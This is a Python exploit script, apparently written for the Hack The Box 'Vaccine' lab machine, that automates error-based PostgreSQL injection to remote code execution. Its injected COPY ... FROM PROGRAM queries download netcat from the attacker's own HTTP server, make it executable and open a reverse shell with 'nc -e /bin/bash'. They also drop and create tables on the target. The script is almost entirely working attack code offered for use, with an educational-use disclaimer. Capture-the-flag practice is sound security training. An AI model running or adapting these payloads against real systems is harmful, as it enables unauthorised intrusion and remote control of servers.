#!/usr/bin/python3

# ORIGINAL SOURCE
# https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine
# Modifier: lkim94

# DESCRIPTION
# A Python program that automates the process of error-based PostgreSQL injection RCE on the MegaCorp Car Catalogue-
# Website running on of one of the Hack The Box's machine 'Vaccine'. http://10.10.10.46/dashboard.php
#
# It provides reverse shell connection to the attacker by mainly doing the followings:
# 1. Copies the origial Netcat file (/usr/bin/nc) to the local /tmp directory of the attacker's machine.
# 2. Sets up an HTTP server on the local /tmp directory.
# 3. Creates a new table in the database of the target server.
# 4. Injects a query that initiates a file transfer command to download a Netcat binary file from attacker's machine.
# 5. Injects a query that executes the downloaded Netcat to initiate reverse shell.
#
# This is to be used for educational and security testing purposes only and I'm not responsible for the misuse of this program.

# CAUTION
# The shell disconnects when there's a few minutes of inactivity.
# Terminating this program's process while the shell is active can also cause unexpected disconnection.

# USAGE
# nc -lvnp <listen_port#>
# python3 PostgreSQL-Shell.py -L <attacker_ip> -l <listen_port#> -t <target_ip> -p <url_parameter> -c <cookie>

# EXAMPLE
# python3 PostgreSQL-Shell.py -L 10.10.14.44 -l 4444 -t 10.10.10.46 -p dashboard.php?search=car -c PHPSESSID=akebd2jzejfk47n3n3xucj4vem


import argparse, requests, random, os, threading, time, sys

# Function for handling command arguments.
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-L", "--lhost", dest="lhost", help="Specifies the IP address of the attacker.")
    parser.add_argument("-l", "--lport", dest="lport", help="Specifies the port number to accept reverse shell connection.")
    parser.add_argument("-t", "--target", dest="target", help="Specifies the IP address of the target.")
    parser.add_argument("-p", "--parameter", dest="parameter", help="Specifies the URL parameter. Ex) -p dashboard.php?search=car ")
    parser.add_argument("-c", "--cookie", dest="cookie", help="Specifies the session cookie. Ex) -c PHPSESSID=akebd2jzejfk47n3n3xucj4vem")
    values = parser.parse_args()
    return values.lhost, values.lport, values.target, values.parameter, values.cookie

# Function for copying a Netcat binary file to the local /tmp directory and hosting a web server on it.
def start_http_server():
    print(f"\n[+] Copying Netcat binary to the local /tmp directory...")
    os.system('cp /usr/bin/nc /tmp')

    print(f"\n[+] Setting up HTTP server on port 8080 on /tmp directory...")
    os.system('cd /tmp; python3 -m http.server 8080')

    print("\n[+] Removing Netcat binary from the local /tmp directory...")
    os.system('rm /tmp/nc')

# Function for sending the SQLI queries that downloads Netcat binary, and execute it to initiate reverese shell.
def send_queries(lhost, lport, cookie, url, suffix):
    table_dropq = f"{url}';DROP TABLE IF EXISTS cmd_{suffix}; -- -"
    table_creationq = f"{url}';CREATE TABLE cmd_{suffix}(cmd_output text); -- -"
    netcat_downloadq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'wget -P /tmp/{suffix} http://{lhost}:8080/nc'; -- -"
    netcat_chmodq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'chmod 777 /tmp/{suffix}/nc'; -- -"
    revshellq = f"{url}';COPY cmd_{suffix} FROM PROGRAM '/tmp/{suffix}/nc -e /bin/bash {lhost} {lport}'; -- -"

    request = requests.Session()

    print(f"\n[+] Sending a table drop query...\n[+] Query => {table_dropq}")
    r = request.get(table_dropq, cookies=cookie)

    print(f"\n[+] Sending a table creation query...\n[+] Query => {table_creationq}")
    r = request.get(table_creationq, cookies=cookie)

    print(f"\n[+] Sending a Netcat download query...\n[+] Query => {netcat_downloadq}")
    r = request.get(netcat_downloadq, cookies=cookie)

    print(f"\n[+] Sending a chmod query for Netcat...\n[+] Query => {netcat_chmodq}")
    r = request.get(netcat_chmodq, cookies=cookie)

    print(f"\n[+] Sending a reverse shell execution query...\n[+] Query => {revshellq}")
    r = request.get(revshellq, cookies=cookie)


try:
    user_input = get_arguments()
    lhost = user_input[0]
    lport = user_input[1]
    target = user_input[2]
    param = user_input[3]
    cookie = user_input[4].split("=")
    cookie = {cookie[0]:cookie[1]}
    url = f"http://{target}/{param}"
    suffix = random.randrange(1000, 9999)

    http_server_thread = threading.Thread(target=start_http_server)
    query_thread = threading.Thread(target=send_queries, args=(lhost,lport,cookie,url,suffix))

    http_server_thread.start(); time.sleep(3)
    send_queries(lhost, lport, cookie, url, suffix)

except KeyboardInterrupt:
    sys.exit()